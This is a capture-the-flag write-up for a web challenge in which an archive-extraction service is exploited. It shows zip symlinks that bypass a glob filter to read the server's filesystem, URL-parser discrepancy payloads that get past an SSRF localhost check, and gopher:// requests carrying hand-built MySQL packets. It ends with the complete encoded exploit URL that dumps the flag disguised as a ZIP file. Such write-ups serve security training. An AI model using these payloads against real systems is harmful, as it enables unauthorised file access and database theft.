# extract0r - web - medium

> Found this great new extraction service. Enjoy!

> Difficulty: medium


# Writeup

In this challenge you can access a website that will extract archives for you. There is no upload functionality, but instead you provide a URL and the website will fetch your archive from there. The extraction occurs in a folder with a random hash name, so you won't interfer with other users. 

## Leaking files

Of course some simple things to try are:
  * Upload a PHP file
  * Upload a .htaccess to allow PHP execution

However, these will all fail. An interesting object that can be stored inside a .zip is a symlink. If you have been playing CTF for a while, you know that when you can extract or compress ZIP archives, you probably have to do something with symlinks ;-) 

A simple way to create a symlink that points to /:

```bash
    ln -s / root
    zip --symlinks foo.zip root
```
Note the `--symlinks` flag, without it the actual contents of the symlinks are stored in the .zip instead of the symlink itself. If you upload the created .zip file, you will be greeted with the following message:


```
WARNING:
we have deleted some folders from your archive for security reasons with our cyber-enabled filtering system!
```

If you check the `cyber-enabled filtering system` you will notice it uses `glob($directory . "/*")` to remove any file that is not a file, i.e. links and directories. So you can create a symlink to known files like /etc/passwd, but you can't get a directory listing unless you bypass the filter. If you play around with `glob` you might notice that files starting with a dot (hidden files) are not listed by it. Therefore you can bypass the filter:

```bash
    ln -s / .root
    zip --symlinks foo.zip .root
```

Now look at your extracted files, you can't see `.root` since apache doesn't list hidden files, but it's there. Just point your browser to `/3b5f55dbd0dc04d87dd55855a275dd0a65195b61/.root` and you will have access to the whole filesystem:

![filesystem](https://i.imgur.com/k752d2A.png)

## Finding the flag

If you look around the filesystem you will stumble upon `/home/extract0r` which contains a file called`create_a_backup_of_my_supersecret_flag.sh`. It is a basic script that should hint where the flag is located: in a table called `flag` inside a mysql database. You can also see that the mysql user `m4st3r_ov3rl0rd` has access to it and he doesn't use a password (this will be important later).

OK so you probably have to connect to the mysql database and get the flag from there. You might think you need to get RCE, but you don't :) 

Remember you can let the server make requests to fetch your archive? We will use that functionality to connect to the mysql database and extract the flag. 


## Bypassing SSRF filter

However, MySQL only listens on localhost, so we have to somehow make a request to localhost. A simple `http://localhost:3306/` will fail:

```
ERROR
Couldn't resolve your host 'localhost' or the resolved ip '127.0.0.1' is blacklisted!
```

There is a protection in place which will not allow you to connect to localhost. As you have access to the filesystem now, you can just download the source files `index.php` and `url.php`. In `url.php` there is a rather long logic to prevent SSRF to localhost (or any other blacklisted ip range).  

How it works:

  1. Use PHP's `parse_url` to split the provided URL into its host, scheme, port, path, etc. parts
  2. Clean each part (didn't want people to just use Orange's SSRF paper...)
  3. Resolve the host and check if it matches a blacklist.
  4. Rebuild the URL.
  5. Use curl with DNS and Port pinning.

The way to trick the script is to make curl and PHP's `parse_url` parse different hosts. That way the script will verify a valid host like google.com, but curl will in fact request a blacklisted host like localhost.

You can play around with it and you will come up with a payload similar to this:
```
    http://foo@localhost:foo@google.com:3306/
```

Curl will parse `localhost` as host, whereas PHP will parse `google.com` as host. The check will pass and curl will request localhost.

### Intended solution

The above solution is what every team used as far as I can tell from logs. For some reason I didn't find that solution when I created the challenge... My intended solution uses a domain inside IPv6 notation:

```
    http://foo@[cafebabe.cf]@google.com:3306/
```

You can't just use a IPv6 IP because digits are removed by the filter. Also curl only allows hexadecimal characters between the brackets. So you had to come up with a domain that only consisted of a-f: .cf domains are free and I registered cafebabe.cf which points to 127.0.0.1.

I was a bit sad when I saw how teams solved it, cause I think the intended solution is way more fun :P But oh well, curl fucked with me once again hehe

## Talking to mysql

So at this point you can make requests to port 3306 on localhost. Of course mysql doesn't talk http so you probably wanna use a different protocol like gopher://. Gopher allows you to control all the bytes transmitted, whereas with http you have the headers and other url-encoded data that you don't control.

The next step was to figure out how to talk to mysql. Mysql uses a binary protocol and a handshake to login users. So you should not be able to connect to it via a single request. However, if you check in Wireshark, you will notice that a user login without password doesn't require the handshake.

Basically just watch the packets you see in Wireshark and rebuild them in your exploit. You can see that in my [exploit](exploit/exploit.py):

First the login packet:
```python
auth = bytearray([
    0x48, 0x0, 0x0,     # length
    0x1,                # seqid
    0x85, 0xa6, 0x3f, 0x20, 0, 0, 0, 0x1, 0x21, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0
] + list(b'm4st3r_ov3rl0rd') + [      # mysql user
    0, 0,               # pass length & pass
] + list(b'mysql_native_password') + [
    0, 0,
])
```

And then the packet for the SELECT command:
```python
def make_cmd(cmd):
    length = struct.pack("<I", len(cmd) + 2)[:3]

    return length + bytearray([
        0x0,         # seqid
        0x3,   # select query
    ]) + cmd
```

Using these packets we can now talk to MySQL and execute a SELECT query.

## Extracting the flag

Reading out the flag should be as easy as running the `SELECT flag FROM flag` query. However, the webapp doesn't display results, it only extracts archives. How can you therefore get the flag out of the database and displayed? 

The hard way: Use time-based blind "injection" to dump the flag char by char like in a SQL injection scenario.

The easy and intended way: Simply prepend and append to the flag the correct ZIP headers/footers so that the webapp will think it is a ZIP archive and extract it. You can see that in my exploit:

```python
flag_dummy = b"B"*100

payload = zip_tools.create_zip(b"gimme_flag", flag_dummy)

prefix = bytes(payload.split(flag_dummy)[0])
suffix = bytes(payload.split(flag_dummy)[1])


sql_cmd = b"select concat(cast(0x" + hexlify(prefix) + b" as binary), rpad(flag, 100, 'A'), cast(0x" + hexlify(suffix) + b" as binary)) from flag.flag-- -"
```
First I create a ZIP that contains a file called "gimme\_flag" which contains a dummy string "B"\*100.
I want to build a SQL query that will replace my dummy string with the flag. I just split my ZIP archive on the dummy string to get `prefix` and `suffix` and then I do a SQL concat of the prefix, the flag (padded to the length of my dummy string) and the suffix. Therefore the result of the SELECT query will be a valid ZIP archive with one file in it that contains the flag.

## Getting the flag!

Ok so now you've got everything you need to finally get the flag. Just url-encode the MySQL packets and append them to the URL that bypasses the SSRF check:

```
gopher://foo@[cafebabe.cf]@google.com:3306/MYSQL_PACKET_HERE
```

How the final URL looks like (produced by running `python exploit/exploit.py`):

```
gopher://foo@[cafebabe.cf]@yolo.com:3306/A%48%00%00%01%85%a6%3f%20%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%6d%34%73%74%33%72%5f%6f%76%33%72%6c%30%72%64%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%00%4c%01%00%00%03%73%65%6c%65%63%74%20%63%6f%6e%63%61%74%28%63%61%73%74%28%30%78%35%30%34%62%30%33%30%34%30%61%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%36%34%30%30%30%30%30%30%36%34%30%30%30%30%30%30%30%61%30%30%30%30%30%30%36%37%36%39%36%64%36%64%36%35%35%66%36%36%36%63%36%31%36%37%20%61%73%20%62%69%6e%61%72%79%29%2c%20%72%70%61%64%28%66%6c%61%67%2c%20%31%30%30%2c%20%27%41%27%29%2c%20%63%61%73%74%28%30%78%35%30%34%62%30%31%30%32%31%65%30%33%30%61%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%36%34%30%30%30%30%30%30%36%34%30%30%30%30%30%30%30%61%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%30%36%37%36%39%36%64%36%64%36%35%35%66%36%36%36%63%36%31%36%37%35%30%34%62%30%35%30%36%30%30%30%30%30%30%30%30%30%31%30%30%30%31%30%30%33%38%30%30%30%30%30%30%38%63%30%30%30%30%30%30%30%30%30%30%20%61%73%20%62%69%6e%61%72%79%29%29%20%66%72%6f%6d%20%66%6c%61%67%2e%66%6c%61%67%2d%2d%20%2d%46%4f%4f%4f%4f%4f%4f%4f%4f%4f%4f%4f%4f%42%41%52
```

Provide that URL to extract0r et voila:

![da flag](https://i.imgur.com/R36K0Dd.png)

Click on it to get the flag:

![da flag](https://i.imgur.com/t9YQ7Xz.png)

(The A's are the padding added to the flag to pad it to the size of the dummy string)

Hope you guys liked the challenge!
